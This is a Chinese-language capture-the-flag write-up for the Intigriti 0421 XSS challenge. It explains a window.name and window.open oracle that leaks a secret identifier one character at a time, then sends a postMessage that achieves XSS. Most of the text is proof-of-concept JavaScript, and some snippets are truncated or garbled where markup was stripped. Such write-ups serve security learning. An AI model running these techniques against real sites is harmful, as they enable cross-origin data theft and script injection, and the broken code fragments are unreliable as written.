那么，现在还需要突破跨域获取`top.name`的限制。经过大量的尝试，一直到提交期截止，也没能找到合适的方式，来捕获用于泄露`identifier`的`window.name`。因为不重新加载窗口的情况下，直接读取跨源资源的`window.name`是不可能的。
通过对赛后POC的思路启发，这里利用了一个特别巧妙的方法。举个例子，当我们执行`window.open("http://XXXX",66)`时，就会弹出一个`window.name='66'`的窗口。但如果已经有一个窗口为`66`，就会执行重定向到该窗口而不是重新弹出。有了这个特性，可以通过一种“试”的方法，暴力测试我们想要获取的题目页面的`window.name`。
这里使用了一个`` 来调用`window.open()`，允许top导航变化，但会禁止弹出。
同时，当测试出的`window.name`值与实际值一致时，防止真的重定向发生，设置一个无效的协议`xxxx://no-trigger`。这里进行一个简单的验证，例如打开一个`window.name='6'` 的题目页面，通过`
    window.open("https://challenge-0421.intigriti.io/?error=",3)
    function getTopName() {
      let i = 0;
      for (; i  {
          let x;
          try {
            // shouldn't trigger new navigation
            x = xss.open('xss://xss', i);
            // this is for firefox
            if (x !== null) return 1;
            return;
          } catch (e) {}
        })();
        if (res) break;
      }
      return i;
    }
    topName = getTopName();
    console.log("top_window.name"+topName);
当我们打开poc.html后，会弹出`https://challenge-0421.intigriti.io/?error=
      xss poc
       Leaked identifier: 
      window.open("https://challenge-0421.intigriti.io/?error=#")
    function getTopName() {
      let i = 0;
      for (; i  {
          let x;
          try {
            // shouldn't trigger new navigation
            x = xss.open('xss://xss', i);
            // this is for firefox
            if (x !== null) return 1;
            return;
          } catch (e) {}
        })();
        if (res) break;
      }
      return i;
    }
    keywords = "0123456789abcdefghijklmnopqrstuvwxyz~";
    function get_char(){
        topName = getTopName();
        char = keywords[topName-1];
        console.log("get_top_window.name: "+ topName);
        console.log("this_char: "+ char)
    }
    setTimeout(get_char,100);
结合前面可以通过`window.name`值的累加推算出`identifier`某位的字符，现在又可以通过外部页面获得`top.name`值。通过获得的`top.name`值找到对应的字符，保存在`location.hash`中，继续构造循环及比较下去，即可推算出`identifier`的所有值。为了构造这个循环，需要对重新不停的重新载入题目页面，完成每一次的`identifier`每一位的求解，这里对payload进行了改进，插入两个`
    top.xss.location = URL.createObjectURL(new Blob([], { type: 'text/html'}));
当成功泄露出`identifier`值后，即可构造`postMessage`消息，实现xss
## POC
综上，将所有的思路联合起来就能突破题目的各种限制：  
1.`
        Leaked identifier: 
        const keywords = "0123456789abcdefghijklmnopqrstuvwxyz~"
        const payload = keywords.split('').map(c =>       `location.hash+/${c}/.source`
        );
         if (top === window) {
            let startxss = confirm("Start XSS?");
            if(!startxss) throw /stopped/;
            name = 0;
            location = top_url + '##'
            throw /stop/
         }
        let lastValue = 0;
        let identifier = '';
        let stop = false;
        async function getTopName() {
            let i = 0;
            // it's just magic. tl;dr chrome and firefox work differently 
            // but this polyglot works for both;
            for (; i  {
                    let x;
                    try {
                        // shouldn't trigger new navigation
                        x = xss.open('xxxx://no-trigger', i + lastValue);
                        // this is for firefox
                        if (x !== null) return 1;
                        return;
                    } catch (e) {}
                })();
                if (res) break;
            }
            return i + lastValue;
        }
        async function watchForNameChange() {
            let topName = await getTopName();
            if (topName !== lastValue) {
                const newTopName = topName - lastValue;
                lastValue = topName;
                get_char(newTopName - 1);
            } else {
                setTimeout(watchForNameChange, 60);
            }
        }
        function oracleLoaded() {
            watchForNameChange();
        }
        function log(identifier) {
            leakedIdentifier.innerHTML = identifier;
            console.log(identifier);
        }
        function get_char(d) {
            let c = keywords[d]
            if (c === '~') {
                identifier = identifier.slice(0, -1) + keywords[keywords.search(identifier.slice(-1)) + 1];
                log(identifier);
                expxss(identifier);
                return;
            }
            identifier += c;
            log(identifier);
            top.location = top_url + '##' + identifier;
            top.lload.location = URL.createObjectURL(new Blob([
                'onload=top.x.oracleLoaded'
            ], {
                type: 'text/html'
            }));
        }
        function expxss(identifier) {
            stop = true;
            top.postMessage({
                type: 'waf',
                identifier,
                str: ``,
                safe: true
            }, '*')
        }
        onload = () => {
            setTimeout(watchForNameChange, 60);
        }
成功实现xss，通过挑战！
这里再对hits进行一个解释：
> （4.19）First hint: find the objective!【 提示``】  
>  （4.20）Time for another hint! Where to smuggle data?【提示`object
> data`以及后面可以利用的`locatino.hash`】  
>  （4.20）Time for another tip! One bite after
> another!【提示需要一位一位的泄露`identifier`】  
>  （4.20）Here’s an extra tip: ++ is also an assignment
> 【提示可以利用++巧妙的跨站测算出`identifier`】  
>  （4.22）Let’s give another hint:”Behind a Greater Oracle there stands one
> great Identity” (leak it) 【提示构造比较的方式泄露`identifier`】  
>  （4.23）Tipping time! Goal  【提示利用`  （4.24）Another hint: you might need to unload a custom loop! 【提示构造循环】
最后，再放一些利用其他方式的POC。  
利用``:
    var payload = `
    `
        var payload = // see above
        payload = encodeURIComponent(payload)
        var baseUrl = 'https://my_server'
        // reset first
        fetch(baseUrl + '/reset').then(() => {
          start()
        })
        async function start() {
          // assume identifier start with 1
          console.log('POC started')
          if (window.xssWindow) {